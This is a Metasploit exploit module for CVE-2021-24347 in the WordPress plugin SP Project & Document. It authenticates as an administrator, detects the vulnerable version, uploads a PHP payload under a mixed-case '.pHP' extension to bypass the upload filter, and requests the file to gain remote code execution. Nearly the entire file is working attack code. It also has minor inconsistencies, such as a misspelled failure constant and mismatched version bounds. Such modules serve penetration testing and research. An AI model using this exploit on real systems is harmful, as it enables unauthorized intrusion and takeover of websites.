##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress Plugin SP Project and Document - Authenticated Remote Code Execution',
        'Description' => %q{
          This module allows an attacker with a privileged Wordpress account to launch a reverse shell
          due to an arbitrary file upload vulnerability in Wordpress plugin SP Project & Document < 4.22.
          This is due to an incorrect check of the uploaded file extension which should be of SGBP type.
          Indeed, even if it is not possible to upload `.php` files, the security check only works with lowercase
          making possible to upload `.pHP` files for instance.
          Finally, the uploaded payload can be triggered by a call to `/wp-content/uploads/sp-client-document-manager/<user_id>/my_payload.php`
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'RON JOST', # Exploit-db
            'Yann Castel (yann.castel[at]orange.com)' # Metasploit module
          ],
        'References' =>
          [
            ['EDB', '50115'],
            ['CVE', '2021-24347']
          ],
        'Platform' => [ 'php' ],
        'Arch' => ARCH_PHP,
        'Targets' =>
        [
          [ 'Wordpress SP Project & Document < 1.6.0', {}]
        ],
        'Privileged' => true,
        'DisclosureDate' => '2021-06-14',
        'Notes' =>
          {
            'Stability' => [ CRASH_SAFE ],
            'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
            'Reliability' => [ REPEATABLE_SESSION ]
          }
      )
    )

    register_options [
      OptString.new('USERNAME', [true, 'Username of the admin account', 'admin']),
      OptString.new('PASSWORD', [true, 'Password of the admin account', 'admin']),
      OptString.new('TARGETURI', [true, 'The base path of the Wordpress server', '/'])
    ]
  end

  def authenticate
    r = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/wp-login.php')
    })

    fail_with Failure::Unreachable "Target #{RHOST} could not be reached." unless r
    cookie = r.get_cookies
    r = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/wp-login.php'),
      'headers' => {
        'Origin' => full_uri('')
      },
      'cookie' => cookie,
      'vars_post' => {
        'log' => datastore['USERNAME'],
        'pwd' => datastore['PASSWORD'],
        'wp-submit': 'Log In',
        testcookie: '1'
      }
    )

    fail_with Failure::Unreachable "Target #{RHOST} could not be reached." unless r

    if r.code == 302
      return r.get_cookies
    end

    nil
  end

  def check
    r = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/wp-login.php')
    })

    if r&.code == 200
      cookie = authenticate
      if cookie
        r = send_request_cgi({
          'method' => 'GET',
          'cookie' => cookie,
          'uri' => normalize_uri(target_uri.path, '/wp-admin/plugins.php'),
          'Referer' => full_uri('/wp-admin/users.php')
        })

        fail_with Failure::Unreachable "Target #{RHOST} could not be reached." unless r
        if r.code == 200
          version = r.body.to_s.match(%r{data-plugin="sp-client-document-manager/cu.php">.*?Version (\d+.\d+)}m)
          if version && version[1]
            print_good("Version #{version[1]} of plugin SP Project & Document Manager found !")
            if Rex::Version.new(version[1]) < Rex::Version.new('4.22')
              CheckCode::Vulnerable('This version of SP Project & Document Manager is vulnerable !')
            else
              CheckCode::Safe('Only versions of SP Project & Document Manager < 4.22 are vulnerable')
            end
          else
            CheckCode::Safe('Plugin SP Project & Document Manager not found !')
          end
        else
          CheckCode::Unknown("Can't retrieve Wordpress plugins page")
        end
      else
        CheckCode::Unknown('The admin credentials given are wrong !')
      end
    else
      CheckCode::Unknown("Can't access the Wordpress web interface !")
    end
  end

  def get_user_id(cookie)
    r = send_request_cgi({
      'method' => 'GET',
      'cookie' => cookie,
      'uri' => normalize_uri(target_uri.path, 'wp-admin/admin.php'),
      'Referer' => full_uri('/wp-admin/users.php'),
      'vars_get' => {
        'page' => 'sp-client-document-manager-fileview'
      }
    })
    fail_with Failure::Unknow "Target #{RHOST} could not be reached." unless r
    user_id = r.body.to_s.match(%r{<option value='(\d+)'>#{datastore['USERNAME']}</option>})
    fail_with Failure::UnexpectedReply "Can't find user id on plugin page" unless (user_id && user_id[1])
    user_id[1]
  end

  def exploit
    cookie = authenticate
    fail_with Failure::UnexpectedReply 'Authentication failed' unless cookie
    user_id = get_user_id(cookie)
    payload_name = "#{Rex::Text.rand_text_alpha_lower(5)}.pHP"

    post_data = Rex::MIME::Message.new
    post_data.add_part('a1b3bac1bc', nil, nil, "form-data; name='cdm_upload_file_field'")
    post_data.add_part("/wordpress/wp-admin/admin.php?page=sp-client-document-manager-fileview&id=#{user_id}", nil, nil, "form-data; name='_wp_http_referer'")
    post_data.add_part('exploits', nil, nil, "form-data; name='dlg-upload-name'")
    post_data.add_part('', 'application/octet-stream', nil, "form-data; name='dlg-upload-file[]'; filename=''")
    post_data.add_part(payload.encoded, 'application/x-php', nil, "form-data; name='dlg-upload-file[]'; filename='#{payload_name}'")
    post_data.add_part('', nil, nil, "form-data; name='dlg-upload-notes'")
    post_data.add_part('Upload', nil, nil, "form-data; name='sp-cdm-community-upload'")

    print_status("Uploading file \'#{payload_name}\' containing the payload...")

    r = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, "wp-admin/admin.php?page=sp-client-document-manager-fileview&id=#{user_id}"),
      'headers' => {
        'Origin' => full_uri(''),
        'Referer' => full_uri("wp-admin/admin.php?page=sp-client-document-manager-fileview&id=#{user_id}")
      },
      'cookie' => cookie,
      'data' => post_data.to_s,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
    )

    send_request_cgi(
      'method' => 'GET',
      'cookie' => cookie,
      'uri' => normalize_uri(target_uri.path, "/wp-content/uploads/sp-client-document-manager/#{user_id}/#{payload_name.downcase!}")
    )

    if r&.code == 302

      print_status('Triggering the payload ...')
      send_request_cgi(
        'method' => 'GET',
        'cookie' => cookie,
        'uri' => normalize_uri(target_uri.path, "/wp-content/uploads/sp-client-document-manager/#{user_id}/#{payload_name}")
      )
    else
      fail_with Failure::UnexpectedReply "Wasn't able to upload the payload file"
    end
  end
end
